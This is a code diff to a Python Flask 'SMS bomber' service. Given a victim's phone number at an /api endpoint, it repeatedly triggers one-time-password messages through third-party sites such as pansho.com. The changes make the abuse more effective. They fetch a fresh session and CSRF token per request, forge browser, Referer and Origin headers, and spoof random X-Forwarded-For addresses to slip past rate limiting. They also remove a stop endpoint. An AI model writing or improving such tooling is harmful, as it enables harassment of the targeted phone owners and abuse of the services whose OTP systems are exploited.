@@ -59,117 +59,169 @@ def validate_key(key):
         load_keys_from_github()
     return key in active_keys
 
-# ===== PANSHO SESSION =====
-def get_pansho_session():
+# ===== PANSHO FRESH SESSION (EVERY TIME) =====
+def get_fresh_pansho_session():
+    """Get a completely fresh session for each request"""
     session = req_lib.Session()
     headers = {
         'User-Agent': random.choice([
-            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
-            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
-            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
         ]),
-        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
         'Accept-Language': 'en-US,en;q=0.5',
         'Accept-Encoding': 'gzip, deflate, br',
+        'Connection': 'keep-alive',
+        'Upgrade-Insecure-Requests': '1',
+        'Sec-Fetch-Dest': 'document',
+        'Sec-Fetch-Mode': 'navigate',
+        'Sec-Fetch-Site': 'none',
+        'Sec-Fetch-User': '?1',
+        'Cache-Control': 'no-cache',
+        'Pragma': 'no-cache'
     }
     try:
-        resp = session.get('https://pansho.com/', headers=headers, timeout=10)
+        # First, get the main page to get cookies and CSRF token
+        resp = session.get('https://pansho.com/', headers=headers, timeout=15)
         soup = BeautifulSoup(resp.text, 'html.parser')
+        
+        # Extract CSRF token from meta tag
         token = None
-        token_input = soup.find('input', {'name': '_token'})
-        if token_input:
-            token = token_input.get('value')
+        meta = soup.find('meta', {'name': 'csrf-token'})
+        if meta:
+            token = meta.get('content')
+        
+        # If not found, try input field
         if not token:
-            meta = soup.find('meta', {'name': 'csrf-token'})
-            if meta:
-                token = meta.get('content')
+            token_input = soup.find('input', {'name': '_token'})
+            if token_input:
+                token = token_input.get('value')
+        
         if not token:
             token = 'DUMMY_TOKEN'
-        return session, session.cookies.get_dict(), token
+        
+        # Get cookies as dict
+        cookies = session.cookies.get_dict()
+        
+        # Also get the session cookie specifically
+        if '6valley1766056533_session' in session.cookies:
+            cookies['6valley1766056533_session'] = session.cookies['6valley1766056533_session']
+        
+        print(f"✅ Fresh Pansho session | Token: {token[:20]}... | Cookies: {len(cookies)}")
+        return session, cookies, token
     except Exception as e:
         print(f"❌ Pansho session failed: {e}")
         return None, None, None
 
-# ===== SEND REQUEST =====
+# ===== SEND REQUEST WITH FRESH SESSION =====
 def send_request(req, phone):
     try:
         if 'pansho' in req['name'].lower():
-            session, cookies, token = get_pansho_session()
+            # Get fresh session every time
+            session, cookies, token = get_fresh_pansho_session()
             if not session:
                 return False
+            
             headers = req['headers'].copy()
             headers['User-Agent'] = random.choice([
-                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
-                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36'
+                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
             ])
+            headers['Referer'] = 'https://pansho.com/'
+            headers['Origin'] = 'https://pansho.com'
+            headers['X-Requested-With'] = 'XMLHttpRequest'
+            
+            # Replace placeholders
             body = req['body'].replace('{phone}', phone).replace('{token}', token)
-            r = session.post(req['url'].replace('{phone}', phone), headers=headers, data=body, timeout=5)
+            
+            # Update cookies in session
+            session.cookies.update(cookies)
+            
+            print(f"📤 Sending Pansho OTP to {phone} with token: {token[:20]}...")
+            r = session.post(req['url'].replace('{phone}', phone), headers=headers, data=body, timeout=10)
+            
         else:
+            # Testbook - fresh session each time
             session = req_lib.Session()
             headers = req['headers'].copy()
             headers['User-Agent'] = random.choice([
-                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
-                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36'
+                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
             ])
             headers['X-Forwarded-For'] = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
+            headers['Accept'] = 'application/json, text/plain, */*'
             
             if req['method'] == 'POST':
                 if isinstance(req['body'], dict):
-                    r = session.post(req['url'].replace('{phone}', phone), headers=headers, json=req['body'], timeout=5)
+                    r = session.post(req['url'].replace('{phone}', phone), headers=headers, json=req['body'], timeout=10)
                 else:
                     body = req['body'].replace('{phone}', phone)
-                    r = session.post(req['url'].replace('{phone}', phone), headers=headers, data=body, timeout=5)
+                    r = session.post(req['url'].replace('{phone}', phone), headers=headers, data=body, timeout=10)
             else:
-                r = session.get(req['url'].replace('{phone}', phone), headers=headers, timeout=5)
+                r = session.get(req['url'].replace('{phone}', phone), headers=headers, timeout=10)
         
+        # Update stats
         with stats_lock:
             stats_data['total_requests'] += 1
             if r.status_code in [200, 302, 201, 202]:
                 stats_data['success'] += 1
                 save_json(STATS_FILE, stats_data)
+                print(f"✅ {req['name']} | {r.status_code} | {phone}")
                 return True
             elif r.status_code == 429:
                 stats_data['rate_limited'] += 1
                 save_json(STATS_FILE, stats_data)
+                print(f"⚠️ Rate Limited | {req['name']} | {phone}")
                 return False
             else:
                 stats_data['failed'] += 1
                 save_json(STATS_FILE, stats_data)
+                print(f"❌ {req['name']} | {r.status_code} | {phone} | {r.text[:100]}")
                 return False
     except Exception as e:
         with stats_lock:
             stats_data['total_requests'] += 1
             stats_data['failed'] += 1
             save_json(STATS_FILE, stats_data)
+        print(f"❌ ERROR: {req['name']} | {phone} | {str(e)[:50]}")
         return False
 
 # ===== ONE-SHOT BOMBING =====
 def one_shot_bombing(phone, key):
     """Execute one round: 3x hits on all active requests"""
-    global stats_data
     active_requests = [r for r in requests_data if r.get('active', True)]
     
     if not active_requests:
         return {"error": "No active requests"}
     
     # Reset stats for this round
+    global stats_data
     stats_data = {"total_requests": 0, "success": 0, "failed": 0, "rate_limited": 0}
     save_json(STATS_FILE, stats_data)
     
     total_hits = 0
     success_hits = 0
+    results = []
     
     # For each active request
     for req in active_requests:
         phone_variants = req.get('phones', [phone])
         target_phone = random.choice(phone_variants) if phone_variants else phone
         
+        req_results = []
         # 3 times hit
         for hit in range(3):
             success = send_request(req, target_phone)
             total_hits += 1
             if success:
                 success_hits += 1
+            
+            req_results.append({
+                "hit": hit + 1,
+                "success": success,
+                "phone": target_phone
+            })
             
             # Log
             with stats_lock:
@@ -183,7 +235,13 @@ def one_shot_bombing(phone, key):
                 logs_data.append(log_entry)
                 save_json(LOGS_FILE, logs_data[-500:])
             
-            time.sleep(0.01)  # Small delay between hits
+            time.sleep(0.05)  # Small delay between hits
+        
+        results.append({
+            "request": req['name'],
+            "hits": req_results,
+            "total_success": sum(1 for r in req_results if r['success'])
+        })
     
     return {
         "success": True,
@@ -193,7 +251,8 @@ def one_shot_bombing(phone, key):
         "total_hits": total_hits,
         "success_hits": success_hits,
         "failed_hits": total_hits - success_hits,
-        "stats": stats_data
+        "stats": stats_data,
+        "details": results
     }
 
 # ===== GLOBALS =====
@@ -235,9 +294,7 @@ def get_logs():
     limit = request.args.get('limit', 50, type=int)
     return jsonify(logs_data[-limit:])
 
-# ===== ===== ===== =====
 # ===== ONE-SHOT API =====
-# ===== ===== ===== =====
 @app.route('/api', methods=['GET'])
 def one_shot_api():
     """GET /api?key=KEY&bomb=PHONE -> 3x hits on all active requests -> auto-stop"""
@@ -256,11 +313,6 @@ def one_shot_api():
     # Execute one-shot bombing
     result = one_shot_bombing(phone, key)
     return jsonify(result)
-
-@app.route('/api/stop', methods=['GET'])
-def simple_stop():
-    """Optional stop - but not needed since one-shot auto-stops"""
-    return jsonify({"message": "One-shot bombing auto-stops after 3x hits. No stop needed."})
 
 @app.route('/api/bomb/start', methods=['POST'])
 def start_bombing_post():
